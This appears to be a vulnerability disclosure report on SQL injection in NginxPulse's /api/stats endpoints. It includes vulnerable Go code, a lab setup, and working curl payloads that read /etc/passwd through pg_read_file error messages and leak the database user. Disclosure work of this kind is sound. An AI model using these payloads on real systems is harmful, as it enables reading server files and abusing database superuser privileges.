# NginxPulse Vulnerability Report

Software: NginxPulse

Developer or vendor: likaia

Code repository: https://github.com/likaia/nginxpulse

## 1. SQL Injection in /api/stats/:type

Brief description: An attacker can inject arbitrary SQL through the `id` parameter of `/api/stats/:type`.

Affected versions: 1.5.0 to 1.6.24

Preconditions: No credentials are required by default. If the target has configured access keys (`system.accessKeys`), the attacker must hold one of those keys.

### Root Cause

`parseStatsQuery` parses the parameters of `/api/stats/:type`. It takes `id` from the query string and assigns it to `query.WebsiteID` without validating its format:

```go
// internal/analytics/stats.go:214-221    commit 0d41264ae4
	websiteID, err := getRequiredString(params, "id")
	if err != nil {
		return query, err
	}
	query.WebsiteID = websiteID
```

The statistics code treats `WebsiteID` as part of a table name and interpolates it into SQL with `fmt.Sprintf`. For `overall`:

```go
// internal/analytics/overall_stats.go:219-225    commit 0d41264ae4
	aggQuery := sqlutil.ReplacePlaceholders(fmt.Sprintf(`
        SELECT 
            COALESCE(SUM(pv), 0) as pv,
            COALESCE(SUM(traffic), 0) as traffic
        FROM "%s_agg_daily"
        WHERE day >= ? AND day <= ?`,
		websiteID))
```

`id` sits inside double quotes, so a single double quote closes the identifier and the attacker can append a `JOIN` clause. `--` comments out only the rest of the line, so the trailing `_agg_daily"` is removed while the `WHERE` on the next line stays intact and the number of placeholders does not change. With `/etc/passwd` as the target, the server executes:

```
        FROM "45c0_agg_daily" JOIN (SELECT 1) z ON 1=(CAST((substr(pg_read_file('/etc/passwd'),1,160)) AS int)) --_agg_daily"
        WHERE day >= $1 AND day <= $2
```

When PostgreSQL fails to cast a string to an integer, it writes the original string into the error message. Casting the result of any subquery inside `CAST(... AS int)` therefore returns that result in the HTTP response, one chunk at a time.

The official image bundles PostgreSQL and initializes it with `initdb --username=nginxpulse` (`entrypoint.sh:8`, `entrypoint.sh:436`). The account the application uses is a cluster superuser, and it may call `pg_read_file`, `lo_from_bytea`, `lo_put`, `lo_export`, `pg_terminate_backend` and similar functions, so the injection grants the privileges of a database superuser.

A related defect exists in the same endpoint family. The `locationType` parameter of the `location` statistics is also unvalidated and is interpolated directly as a column name:

```go
// internal/analytics/client_stats.go:99-111,188-194    commit 0d41264ae4
	locationType = query.ExtraParam["locationType"].(string)
	switch locationType {
	case "domestic", "city":
		statsType = "domestic"
	case "global":
		statsType = "global"
	default:
		statsType = locationType
	}
	...
		selectExpr = "loc." + statsType
```

Here the result appears directly in the response, without an error-based channel:

```bash
curl -s -G http://127.0.0.1:8088/api/stats/location \
  --data-urlencode "id=45c0" --data-urlencode "timeRange=7d" \
  --data-urlencode "limit=5" \
  --data-urlencode "locationType=global||'|'||current_user"
{"key":["未知|nginxpulse"],"pv":[2],"uv":[2],"pv_percent":[100],"uv_percent":[100]}
```

### Reproduction Environment

The lab runs the official compose file:

```bash
mkdir nginxpulse && cd nginxpulse
wget https://raw.githubusercontent.com/likaia/nginxpulse/v1.6.24/docker-compose-simple.yml
mkdir -p docker_local/logs
cat > docker_local/logs/access.log <<'EOF'
203.0.113.10 - - [30/Oct/2026:10:00:00 +0800] "GET /index.html HTTP/1.1" 200 512 "https://example.com/" "Mozilla/5.0"
203.0.113.11 - - [30/Oct/2026:10:01:00 +0800] "GET /about HTTP/1.1" 200 1024 "-" "Mozilla/5.0"
EOF
docker compose -f docker-compose-simple.yml up -d
```

If the UID/GID of the host directories does not match `PUID` and `PGID` in the compose file, adjust the two variables as described in the official documentation.

Open `http://127.0.0.1:8088` in a browser, add the site `demo.example.com` in the setup wizard, set the log path to `/share/logs/*.log`, leave the access key empty, and click save and restart.

### Reproduction

The dashboard shows statistics once the configuration is complete:

![](img/01-dashboard.png)

`GET /api/websites` returns the site id:

```bash
$ curl -s http://127.0.0.1:8088/api/websites
{"websites":[{"id":"45c0","name":"demo.example.com"}]}
```

Replace `id` with the injection payload to read `/etc/passwd`:

```bash
$ curl -s -G http://127.0.0.1:8088/api/stats/overall \
    --data-urlencode "timeRange=7d" \
    --data-urlencode "id=45c0_agg_daily\" JOIN (SELECT 1) z ON 1=(CAST((substr(pg_read_file('/etc/passwd'),1,160)) AS int)) --"
{"error":"查询失败: 获取总体统计失败: 查询总体统计数据失败: ERROR: invalid input syntax for type integer: \"root:x:0:0:root:/root:/bin/sh\nbin:x:1:1:bin:/bin:/sbin/nologin\ndaemon:x:2:2:daemon:/sbin:/sbin/nologin\nlp:x:4:7:lp:/var/spool/lpd:/sbin/nologin\nsync:x:5:0:sync:\" (SQLSTATE 22P02)"}
```
